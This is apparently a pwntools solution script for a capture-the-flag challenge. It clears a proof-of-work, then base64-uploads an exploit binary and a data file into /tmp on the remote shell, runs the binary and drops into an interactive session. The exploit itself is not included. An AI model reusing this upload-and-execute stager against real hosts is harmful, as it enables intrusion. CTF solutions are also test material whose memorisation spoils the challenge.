#!/usr/bin/env python
# coding: utf-8

from pwn import *

# context.log_level = 'debug'

p = remote('fungez.challenges.ooo', 10101)

p.recvuntil('Challenge: ')
chal = p.recvuntil('\n', drop=True)

proof = process('./pow.py {} 22'.format(chal.strip()), shell=True)
proof.recvuntil('Solution: ')
sol = proof.recvuntil(' -> ', drop=True)
p.sendline(sol)
proof.close()

p.sendlineafter(' $ ', 'stty -echo')
p.sendlineafter(' $ ', 'cd /tmp')
p.sendlineafter(' $ ', 'cat << EOFEOFEOF > pwn.b64')
linez = read('pwn').encode('base64')
p.send(linez)
p.sendline('EOFEOFEOF')
p.sendlineafter(' $ ', 'base64 -d pwn.b64 > pwn')
p.sendlineafter(' $ ', 'chmod +x pwn')

p.sendlineafter(' $ ', 'cat << EOFEOFEOF > page.b64')
linez = read('page.bin').encode('base64')
p.send(linez)
p.sendline('EOFEOFEOF')
p.sendlineafter(' $ ', 'base64 -d page.b64 > page.bin')

p.sendlineafter(' $ ', './pwn')

p.interactive()